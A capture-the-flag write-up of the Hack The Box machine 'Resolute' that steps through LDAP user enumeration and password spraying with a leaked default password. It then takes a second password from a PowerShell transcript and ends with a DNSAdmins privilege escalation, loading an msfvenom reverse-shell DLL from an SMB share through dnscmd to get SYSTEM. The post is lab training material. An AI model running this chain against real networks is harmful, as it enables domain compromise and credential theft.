---
layout: post
title:  "HTB - RESOLUTE"
date:   2025-02-05 20:52:24 +0100
categories: ["HTB Machine writeups"]
---
As usually starting with nmap 

```text
nmap 10.10.10.169 -sV -A -Pn   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 18:33 CET
Nmap scan report for 10.10.10.169
Host is up (0.060s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-02-05 17:42:23Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=2/5%OT=53%CT=1%CU=42741%PV=Y%DS=2%DC=T%G=Y%TM=67A3A
OS:177%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=106%TI=I%CI=I%II=I%SS=S%T
OS:S=A)SEQ(SP=FF%GCD=1%ISR=105%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=FF%GCD=1%ISR
OS:=106%TI=RD%CI=I%II=I%TS=C)OPS(O1=M53CNW8ST11%O2=M53CNW8ST11%O3=M53CNW8NN
OS:T11%O4=M53CNW8ST11%O5=M53CNW8ST11%O6=M53CST11)WIN(W1=2000%W2=2000%W3=200
OS:0%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M53CNW8NNS%CC=Y%Q=)
OS:T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=
OS:0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T
OS:6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=1
OS:64%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h47m00s, deviation: 4h37m09s, median: 6m59s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2025-02-05T09:42:42-08:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2025-02-05T17:42:41
|_  start_date: 2025-02-05T17:29:28
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   73.59 ms 10.10.14.1
2   73.68 ms 10.10.10.169

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 115.11 seconds
```

We have destinguished name for domain so lets see if we can get usernames 

```shell
ldapsearch -H ldap://10.10.10.169 -x -b "DC=megabank,DC=local" '(ObjectClass=Person)' sAMAccountName | grep sAMAccountName
```

```
sAMAccountName: Guest
sAMAccountName: DefaultAccount
sAMAccountName: RESOLUTE$
sAMAccountName: MS02$
sAMAccountName: ryan
sAMAccountName: marko
sAMAccountName: sunita
sAMAccountName: abigail
sAMAccountName: marcus
sAMAccountName: sally
sAMAccountName: fred
sAMAccountName: angela
sAMAccountName: felicia
sAMAccountName: gustavo
sAMAccountName: ulf
sAMAccountName: stevie
sAMAccountName: claire
sAMAccountName: paulo
sAMAccountName: steve
sAMAccountName: annette
sAMAccountName: annika
sAMAccountName: per
sAMAccountName: claude
sAMAccountName: melanie
sAMAccountName: zach
sAMAccountName: simon
sAMAccountName: naoki
```

Let's enum deeper on descriptions 

```shell
ldapsearch -H ldap://10.10.10.169 -x -b "DC=megabank,DC=local" | grep description 
```

```text
description: Account created. Password set to Welcome123!   
```

So we have our password. But it appears to be default one, so we need to check if it fits for any usernames we already have. 

```shell
netexec smb 10.10.10.169 -u logins_resolute -p 'Welcome123!'
```

```text
SMB         10.10.10.169    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\Guest:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\DefaultAccount:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\RESOLUTE$:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\MS02$:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\ryan:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.10.10.169    445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
```

Now we know that password fits to melanie user and we can WinRM to it.

```shell
evil-winrm -i 10.10.10.169 -u 'melanie' -p 'Welcome123!'
```
![img-description](/assets/img/resolute_melanie.png)
_WinRM to Melanie account_

Once i started enumerating - this part got tricky because i couldn't find anything interesting initially. 

```shell
bloodhound-python -u 'melanie' -p 'Welcome123!' -d megabank.local -dc resolute.megabank.local -ns 10.10.10.169
```

![img-description](/assets/img/resolute_bloodhound_run.png)
_Remote bloodhound execution_

And since this gave me not much more so i used the hint from guided mode 

```text
What is the full path to the file containing history logs for a PowerShell session?
```

And for me obviously this was about:
`%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

which is default path i check during forensic investigations related to used powershell commands.
Wowever that path was not present on melanie user. Finally i found that it was related to hidden file under path

```text
C:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
```

Not sure if this directory/file is something real or just made up as synthetic way of making it more difficult.

Upon review we can find that file contains new set of credentials for Ryan user so we can login again with another set of credentials 

```shell
evil-winrm -i 10.10.10.169 -u 'ryan' -p 'Serv3r4Admin4cc123!'
```

![img-description](/assets/img/resolute_ryan.png)
_WinRM to Ryan account_

From Bloodhound we can establish that Ryan is member of Contractors group, who is member of DNSAdmins group.

![img-description](/assets/img/resolute_ryan_bloodhound.png)
_Ryan memberships in domain groups_

So lets see how we can abuse it? 

![img-description](/assets/img/resolute_google_dnscmd.png)
_Quick google on abuse technique_

<https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise>

```text
The attack relies on a DLL injection into the dns service running as SYSTEM on the DNS server which most of the time is on a Domain Contoller.
```
So with crafted dll and commandline like above we should be able to execute reverse shell on rights of SYSTEM

```shell
dnscmd dc01 /config /serverlevelplugindll \\10.0.0.2\tools\dns-priv\dnsprivesc.dll
```

So lets give it a try. We start with msfvenom to generate shell.dll

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.31 LPORT=4444 -f dll -o shell.dll 
```

![img-description](/assets/img/resolute_msfvenom_dll.png)
_Generating with MSF rev shell dll_

Then we need to load it into system but for some reason uploaded file is 0 length.

![img-description](/assets/img/resolute_empty_file.png)
_Empty file_

So we need to load it remotely as in example provided on site from google. 

```shell
smbserver.py s .
```

![img-description](/assets/img/resolute_smb.png)
_Starting SMB server_

Starting netcat with 

```shell
nc -nvlp 4444
```
And we can start the show with fingers crossed 

```shell
dnscmd.exe /config /serverlevelplugindll \\10.10.14.31\s\shell.dll
sc.exe \\resolute stop dns
sc.exe \\resolute start dns
```

![img-description](/assets/img/resolute_ryan_load_dll.png)
_Executing dnscmd from remote location_

We successfully get SYSTEM shell

![img-description](/assets/img/resolute_netcat_system.png)
_SYSTEM shell_

At this point its only grab a flag from Admin desktop and voila! 

![img-description](/assets/img/resolute_congrats.png)
_Finish_